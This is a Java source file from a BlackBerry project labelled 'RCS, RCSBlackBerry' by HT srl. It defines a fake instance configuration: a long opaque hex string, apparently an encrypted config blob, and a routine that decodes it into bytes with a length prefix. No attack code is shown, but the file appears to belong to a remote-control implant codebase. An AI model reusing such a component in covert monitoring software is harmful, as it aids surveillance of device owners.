//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package fake;

import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;

public class InstanceConfigFake {
    //#ifdef FAKECONF
     
    //824
    static String configString = "00000000000000002ba72c63c2d989ea1bb88048cd6b4ca8281cfef7a1241da0b3d26154cf04bcb8e2d233196e81719e5e8b707cd49dfab10c3ba7076bd684a5a3b78b8d16f26c14a2d364ffa59f4c7ee6433a28727abe6d920ab9a2bbdfb7e7f7b2a09d097491fba89c4966abb6d06f34fe96b8ff632e42d1ba21acf296e3c6807368090557e9cfdc28e6fcca8d2f5618b3f48b136f21d4467b8cb1356eabb08743862c88eaacf14ac6d1571e0a1083c53db1e695ecb0013ea257af05534bbd67718e2075385bb67505cfa87ea5eb254dfb4cb47daff2413d7989fc33242cf25ab8d2df1316e644378d5a982f27d8faa0b7a03a9c86f3c3aa0bd61152d8a0d57c76ec325da7a5ba8d8de5854e389fce789c67edea6a89e4e86beda9b36d5f6c0db0f13ff91050c3bfab5368109d0991a6bc4499f4b21265574a8d1dd99e3f2d1b38f03a08962061b5b0f9d87a53681f590b98ac5cb82919cbbfc80ea7ef86e9744a1d5d1ec30eff31d39ad64b4066ae37b127e98264fba314cac35586ea335a14e2f2baedf59d9a1cc189d5ecc012e29cf36b1863696471ec4464eb3d230509ec2fbae8c70ab639c02eaaa2a34c4cacaa3dfac02078c0ab4cf089ab12fedd3a8810bd713041684f3a125470bb8df6fdd67b698c1f1b234823611f014d2ec5ee3ae30cc7fe513bd4494ec1357f61fff1ea32051c1c355cd8d1147ab38ee268cba9e42c211c6bec3e33a41fea12b37ff9e32c97891470eea3b727e40b28e2f34fb472ae9b6f6c5b99a4dce68507f1389a09cdba0da67900ba7809383b20d13fec17453b9ae736d9dd56d15c9433ae0fc4f1de818212585d4c3a169b22fbd9357bc0107bb558491e6965fa661e02730146d5686fb86162cdadbe1bdde97dc0479d18d16334d43561d752139517c403644287dfda1824ccbf087967d78ffac131484b487189dd1f518384ecad6a8fc821c0254c8a8550c3fc0acffebb7b728527cb4a5559fe5015e5b16fb16066af1a87d12269719072685da9ac2c732ad08803236c08e86ae0d5bfcadc271c560c77f7da5dce821db6f80a702e72a15ce9c129bbcf0f2841722445bb5e20539466254d7066c326c69c7a93e0604068cddfb73969906d6e7594fac43e90e335ad6b46d2d86e7bb70e22883b211ef0d235a6048ae724766902d92c75d77a6ecb32aeb22a9395f5c56073b41eedc169ca2f04625c0f4d929070e1d8a57b1ba1663afec0f0a33b7729248227fa3401b5c7d31c3bd36ef48fff26af7d213174f1578e6a38a97a7c709f43594fa502316e899e17b552b4fba7f87a20dfbc9c8626a6a6a97ea5f1288dddb438f9c6359574024a00fb38a2bcd55e3df63443cee4c8f957e1c2ff8d439dc0e30f2ce8c5";
    static byte[] config;
    
    public int version = 2;

    public static byte[] getBytes() {        
        config = hexStringToByteArray(configString);        
        return config;
    }
    
    /**
     * Hex string to byte array.
     * 
     * @param wchar
     *            the wchar
     * @return the byte[]
     */
    public static byte[] hexStringToByteArray(final String config) {
        int offset = 4;
        int len = config.length() / 2;
        final byte[] ret = new byte[ len + 4];

        for (int i = offset; i < ret.length; i++) {
            final char first = config.charAt((i - offset) * 2);
            final char second = config.charAt((i - offset) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }
        
        final DataBuffer databuffer = new DataBuffer(ret, 0, 4, false);
        databuffer.writeInt(len);

        return ret;
    }
    
    //#else
    public static byte[] getBytes() {        
        return null;
    }
  //#endif
}

